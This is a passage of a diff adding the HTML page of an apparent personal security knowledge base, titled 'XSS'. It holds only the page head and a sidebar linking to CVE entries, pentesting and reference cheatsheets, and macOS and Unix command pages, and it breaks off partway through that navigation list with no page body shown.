@@ -1,0 +1,1816 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+        <title>XSS - Knowledge Base</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        
+        
+        
+
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="../../assets/css/darcula-highlight.min.css">
+
+        <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../../assets/css/dracula-ui.min.css">
+        <link rel="stylesheet" href="../../assets/css/mkdocs.min.css">
+
+        
+            <link  rel="icon" type="image/x-icon" href="../../assets/img/favicon.ico">
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+                <script>hljs.initHighlightingOnLoad();</script>
+
+ <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
+
+<body class="drac-bg-black-secondary drac-text-grey-ternary drac-text drac-scrollbar-purple">
+
+    <main class="d-flex">
+
+        <!-- block sidebar -->
+            <nav id="sidebar" class="sidebar drac-bg-black">
+    <div class="custom-menu">
+        <button type="button" id="sidebarCollapse" class="btn btn-primary">
+            <i class="fa fa-bars"></i>
+            <span class="sr-only">Menu</span>
+        </button>
+    </div>
+
+    <div class="p-4">
+        
+            <img class="logo" src="../../assets/images/kb.png" height="150px">
+        
+
+        <div class="drac-text-center">
+            
+                <span class="drac-text drac-line-height drac-text-white">Knowledge Base</span>
+            
+        </div>
+
+        <div class="drac-box flex-column">
+            <ul class="dot-ul">
+                <li><div class="dot-li drac-bg-cyan"></div></li>
+                <li><div class="dot-li drac-bg-green"></div></li>
+                <li><div class="dot-li drac-bg-orange"></div></li>
+                <li><div class="dot-li drac-bg-pink"></div></li>
+                <li><div class="dot-li drac-bg-purple"></div></li>
+                <li><div class="dot-li drac-bg-red"></div></li>
+                <li><div class="dot-li drac-bg-yellow"></div></li>
+            </ul>
+        </div>
+
+        <hr class="drac-divider" />
+
+        <!-- block menu -->
+        <ul class="mb-5 drac-list drac-list-none">
+            
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Homepage
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../../page2/"
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Page 2
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#cves-collapse" aria-expanded="false">
+                    CVEs
+                </a>
+                <div class="collapse" id="cves-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2007-1036/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2007-1036
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2012-0002/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2012-0002
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2012-1675/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2012-1675
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2013-4786/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2013-4786
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-0224/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-0224
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-6321/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-6321
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-8272/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-8272
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2016-1287/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2016-1287
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2016-2107/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2016-2107
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-0143/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-0143
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-12542/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-12542
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-8917/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-8917
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2018-10993/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2018-10993
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-0686/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-0686
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-0708/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-0708
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-18935/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-18935
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-19781/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-19781
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-2725/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-2725
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-5392/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-5392
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-0609/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-0609
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-0796/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-0796
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-10487/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-10487
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-1350/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-1350
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-1472/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-1472
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-14882/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-14882
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-5902/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-5902
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-26855/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-26855
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-27850/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-27850
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-34473/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-34473
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-34527/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-34527
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-4034/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-4034
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-40449/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-40449
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-44228/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-44228
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-0847/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-0847
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-21882/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-21882
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-30190/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-30190
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class=" active 
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#cheatsheets-collapse" aria-expanded="false">
+                    Cheatsheets
+                </a>
+                <div class="collapse" id="cheatsheets-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../Active%20Directory%20Pentesting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Active Directory Pentesting Cheatsheet
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Bash%20Scripting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Bash Scripting
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Chrome%20URLs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chrome URLs/Flags
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Default%20Credentials%20Cheat%20Sheet/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Default Credentials Cheat Sheet
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Exchange%20Versions/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Exchange Versions
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../GitHub%20Dorks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            GitHub Dorks
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Google%20Dorks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Google Dorks
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Headers%20%26%20Files/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Headers & Files
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../List%20of%20TLDs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            List of TLDs
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Miscellaneous/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Miscellaneous
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Netmasks%20%26%20Subnetting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netmasks & Subnetting
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../PrivEsc%20Mindmap/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            PrivEsc Mindmap
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Regex/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Regex
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Windows%20Security%20Log%20References/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Windows Security Log References
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="./"
+            class=" active 
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            XSS
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../XXE%20Injection/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            XML External Entity (XXE) Injection
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#macos-commands-collapse" aria-expanded="false">
+                    MacOS Commands
+                </a>
+                <div class="collapse" id="macos-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/caffeinate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Caffeinate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/ditto/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ditto
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/firmwarepasswd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Firmwarepasswd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/ipconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ipconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/networkquality/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Networkquality
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/powermetrics/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Powermetrics
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/scutil/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Scutil
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/security/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Security
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/sha2/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha2
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/softwareupdate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Softwareupdate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/spctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Spctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/system_profiler/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            System_profiler
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/tweaks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tweaks
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#unix-commands-collapse" aria-expanded="false">
+                    Unix Commands
+                </a>
+                <div class="collapse" id="unix-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/apropos/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Apropos
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/apt/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Apt
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/awk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Awk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/base64/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Base64
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/biosdecode/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Biosdecode
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/blkid/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Blkid
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cal/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cal
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chage/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chage
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chmod/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chmod
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chsh/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chsh
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/comm/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Comm
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/crontab/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Crontab
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cut/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cut
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/date/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Date
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/delv/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Delv
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/df/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Df
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/diff/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Diff
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dmesg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dmesg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/faketime/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Faketime
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/fdisk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Fdisk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/file/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            File
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/find/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Find
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/fls/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Fls
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/free/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Free
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ftp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ftp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ghostscript/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ghostscript
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/gpg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Gpg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/grep/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Grep
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/groupadd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Groupadd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/groupdel/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Groupdel
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/hdparm/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Hdparm
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/head/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Head
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/history/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            History
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/host/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Host
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ifconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ifconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/iotop/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Iotop
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ip/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ip
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/iwconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Iwconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/journalctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Journalctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/kill/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Kill
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ln/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ln
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/locate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Locate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ls/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ls
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsb_release/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsb_release
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsblk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsblk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lshw/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lshw
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsmod/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsmod
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lspci/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lspci
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsusb/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsusb
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lvextend/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lvextend
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/md5sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Md5sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mkdir/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mkdir
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mkpasswd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mkpasswd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
